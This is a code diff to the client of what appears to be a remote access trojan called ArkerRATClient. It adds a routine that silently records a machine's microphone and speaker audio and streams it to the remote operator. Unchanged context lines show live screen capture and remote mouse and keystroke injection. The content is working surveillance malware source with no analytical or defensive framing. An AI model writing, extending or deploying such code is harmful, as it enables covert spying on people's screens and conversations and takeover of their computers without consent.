@@ -1,86 +1,4 @@
-﻿//using ArkerRATClient;
-//using System;
-//using System.Collections.Generic;
-//using System.Drawing;
-//using System.Drawing.Imaging;
-//using System.IO;
-//using System.Threading.Tasks;
-//using System.Windows.Forms;
-
-//namespace ARKERRATCLIENT2._0
-//{
-//    public static class RemoteDesktop
-//    {
-//        public static bool sendingFrames = false;
-//        private const int ChunkSize = 1024; // Adjust the chunk size as needed
-
-//        public static async Task StartScreenStreaming()
-//        {
-//            sendingFrames = true;
-
-//            while (sendingFrames)
-//            {
-//                // Capture screenshot
-//                Bitmap screenshot = CaptureScreenshot();
-
-//                // Convert the screenshot to a list of base64-encoded chunks
-//                List<string> chunks = ConvertToBase64Chunks(screenshot);
-
-//                // Send the chunks to the client
-//                await SendChunks(chunks);
-
-//                // Optional delay between frames (adjust as needed)
-//                await Task.Delay(1); // 30 FPS (1 frame every 33.33ms)
-//            }
-//        }
-
-//        private static Bitmap CaptureScreenshot()
-//        {
-//            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-
-//            using (Graphics graphics = Graphics.FromImage(screenshot))
-//            {
-//                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
-//            }
-
-//            return screenshot;
-//        }
-
-//        private static List<string> ConvertToBase64Chunks(Bitmap image)
-//        {
-//            List<string> chunks = new List<string>();
-//            using (MemoryStream memoryStream = new MemoryStream())
-//            {
-//                image.Save(memoryStream, ImageFormat.Jpeg); // You can adjust the image format as needed
-//                byte[] imageBytes = memoryStream.ToArray();
-
-//                // Split the image bytes into chunks
-//                for (int i = 0; i < imageBytes.Length; i += ChunkSize)
-//                {
-//                    int remainingBytes = Math.Min(ChunkSize, imageBytes.Length - i);
-//                    byte[] chunk = new byte[remainingBytes];
-//                    Array.Copy(imageBytes, i, chunk, 0, remainingBytes);
-
-//                    string base64Chunk = Convert.ToBase64String(chunk);
-//                    chunks.Add(base64Chunk);
-//                }
-//            }
-
-//            return chunks;
-//        }
-
-//        private static async Task SendChunks(List<string> chunks)
-//        {
-//            // Send the chunks to the client
-//            foreach (string chunk in chunks)
-//            {
-//                await RATClientSession.SendData("§RemoteDesktopStart§" + chunk + "§RemoteDesktopEnd§");
-//            }
-//            await RATClientSession.SendData("§RemoteDesktopStart§§RemoteDesktopFrameDone§§RemoteDesktopEnd§");
-//        }
-//    }
-//}
-
+﻿
 using ArkerRATClient;
 using System;
 using System.Collections.Generic;
@@ -90,6 +8,8 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using NAudio.CoreAudioApi;
+using NAudio.Wave;
 
 namespace ARKERRATCLIENT2._0
 {
@@ -98,27 +18,113 @@ namespace ARKERRATCLIENT2._0
         public static bool sendingFrames = false;
         private const int ChunkSize = 65536; // Adjust the chunk size as needed
 
+        public static async void StartAudioStreaming()
+        {
+            // Create an instance of WaveInEvent to capture microphone audio
+            WaveInEvent microphoneWaveInEvent = new WaveInEvent();
+            microphoneWaveInEvent.WaveFormat = new WaveFormat(41100, 1); // 44.1 kHz, mono
+
+            // Create an instance of WaveInEvent to capture speaker audio with the same format as the microphone
+            WasapiLoopbackCapture speakerWaveInEvent = new WasapiLoopbackCapture();
+            speakerWaveInEvent.WaveFormat = microphoneWaveInEvent.WaveFormat;
+
+            // Event handler for microphone audio data received
+            microphoneWaveInEvent.DataAvailable += (sender, args) =>
+            {
+                Task.Run(async () =>
+                {
+                    byte[] audioData = new byte[args.BytesRecorded];
+                    Buffer.BlockCopy(args.Buffer, 0, audioData, 0, args.BytesRecorded);
+
+                    // Convert the audio data to a base64-encoded string
+                    string base64Audio = Convert.ToBase64String(audioData);
+
+                    // Split the base64-encoded string into chunks
+                    const int ChunkSize = 10000; // Adjust the chunk size as needed
+                    for (int i = 0; i < base64Audio.Length; i += ChunkSize)
+                    {
+                        int remainingBytes = Math.Min(ChunkSize, base64Audio.Length - i);
+                        string chunk = base64Audio.Substring(i, remainingBytes);
+
+                        // Add the audio indicator and delimiters for microphone audio
+                        string audioChunk = "§RemoteDesktopStart§" + "§IA§" + chunk + "§RemoteDesktopEnd§";
+
+                        // Send the audio chunk to the client
+                        RATClientSession.SendData(audioChunk).Wait(); // Use .Wait() to block the async method
+
+                    }
+                });
+
+            };
+
+            // Event handler for speaker audio data received
+            speakerWaveInEvent.DataAvailable += (sender, args) =>
+            {
+                Task.Run(async () =>
+                {
+                    byte[] audioData = new byte[args.BytesRecorded];
+                    Buffer.BlockCopy(args.Buffer, 0, audioData, 0, args.BytesRecorded);
+
+                    // Convert the audio data to a base64-encoded string
+                    string base64Audio = Convert.ToBase64String(audioData);
+
+                    // Split the base64-encoded string into chunks
+                    const int ChunkSize = 10000; // Adjust the chunk size as needed
+                    for (int i = 0; i < base64Audio.Length; i += ChunkSize)
+                    {
+                        int remainingBytes = Math.Min(ChunkSize, base64Audio.Length - i);
+                        string chunk = base64Audio.Substring(i, remainingBytes);
+
+                        // Add the audio indicator and delimiters for speaker audio
+                        string audioChunk = "§RemoteDesktopStart§" + "§OA§" + chunk + "§RemoteDesktopEnd§";
+
+                        // Send the audio chunk to the client
+                        RATClientSession.SendData(audioChunk).Wait(); // Use .Wait() to block the async method
+                    }
+                });
+            };
+
+            // Start capturing microphone audio
+            microphoneWaveInEvent.StartRecording();
+
+            // Start capturing speaker audio
+            speakerWaveInEvent.StartRecording();
+
+            // Wait for the user to stop audio capture
+            while (sendingFrames && !RATClientSession.noConnection)
+            {
+                await Task.Delay(10);
+            }
+
+            // Stop capturing microphone audio
+            microphoneWaveInEvent.StopRecording();
+            microphoneWaveInEvent.Dispose();
+
+            // Stop capturing speaker audio
+            speakerWaveInEvent.StopRecording();
+            speakerWaveInEvent.Dispose();
+        }
+
+
+
         public static async Task StartScreenStreaming(int quality)
         {
-            
-                sendingFrames = true;
+            while (sendingFrames && !RATClientSession.noConnection)
+            {
+                // Capture screenshot
+                Bitmap screenshot = CaptureScreenshot(quality);
 
-                while (sendingFrames && !RATClientSession.noConnection)
-                {
-                    // Capture screenshot
-                    Bitmap screenshot = CaptureScreenshot(quality);
+                // Convert the screenshot to a list of base64-encoded chunks
+                List<string> chunks = ConvertToBase64Chunks(screenshot, quality);
 
-                    // Convert the screenshot to a list of base64-encoded chunks
-                    List<string> chunks = ConvertToBase64Chunks(screenshot, quality);
-
-                    // Send the chunks to the client
+                // Send the chunks to the client
                 await SendChunks(chunks);
 
-                    // Optional delay between frames (adjust as needed)
-                    await Task.Delay(1);
-                }
-            
+                // Optional delay between frames (adjust as needed)
+                await Task.Delay(1);
+            }
         }
+
 
         private static Bitmap CaptureScreenshot(int quality)
         {
@@ -194,7 +200,7 @@ namespace ARKERRATCLIENT2._0
 
             //Should sort out the delimiter properly sometime idk when dont use replace :(
 
-            string[] cordinates = clickData.Replace("§ClickPositionStart§",string.Empty).Replace("§ClickPositionEnd§",string.Empty).Split(',');
+            string[] cordinates = clickData.Replace("§ClickPositionStart§", string.Empty).Replace("§ClickPositionEnd§", string.Empty).Split(',');
             int x = int.Parse(cordinates[0].Split('.')[0]);
             int y = int.Parse(cordinates[1].Split('.')[0]);
 
@@ -202,7 +208,8 @@ namespace ARKERRATCLIENT2._0
             if (cordinates[2] == "Left")
             {
                 MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.LeftDown | MouseHelper.MouseEventFlags.LeftUp);
-            }else if (cordinates[2] == "Right")
+            }
+            else if (cordinates[2] == "Right")
             {
                 MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.RightDown | MouseHelper.MouseEventFlags.RightUp);
             }
@@ -265,27 +272,27 @@ namespace ARKERRATCLIENT2._0
         {
             //ADD MORE KEYSTROKE SOMETIME
 
-            if(keystroke=="tab")
+            if (keystroke == "tab")
             {
                 SendKeys.SendWait("{TAB}");
             }
-            else if(keystroke == "oemperiod")
+            else if (keystroke == "oemperiod")
             {
                 SendKeys.SendWait(".");
             }
-            else if (keystroke =="leftshift")
+            else if (keystroke == "leftshift")
             {
                 SendKeys.SendWait("+");
             }
-            else if(keystroke == "back")
+            else if (keystroke == "back")
             {
-               SendKeys.SendWait("{BACKSPACE}");
+                SendKeys.SendWait("{BACKSPACE}");
             }
             else if (keystroke == "space")
             {
                 SendKeys.SendWait(" ");
             }
-            else if(keystroke == "return")
+            else if (keystroke == "return")
             {
                 SendKeys.SendWait("{ENTER}");
             }
@@ -304,4 +311,3 @@ namespace ARKERRATCLIENT2._0
         }
     }
 }
-    
